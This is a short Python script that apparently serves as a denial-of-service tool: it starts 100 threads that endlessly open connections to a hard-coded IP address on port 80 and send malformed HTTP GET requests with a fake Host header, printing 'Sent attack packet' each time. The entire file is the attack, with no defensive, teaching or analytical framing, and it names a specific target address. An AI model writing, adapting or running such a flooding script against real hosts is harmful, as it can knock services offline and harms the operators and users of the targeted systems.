import socket
import threading

target = '223.235.184.7'
port =80
fake_ip = '182.162.20.32'

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "Http/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host:"+fake_ip+ "\r\n\r\n").encode('ascii'),(target, port))
            s.close()
            print("Sent attack packet")
        except:
            pass

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()
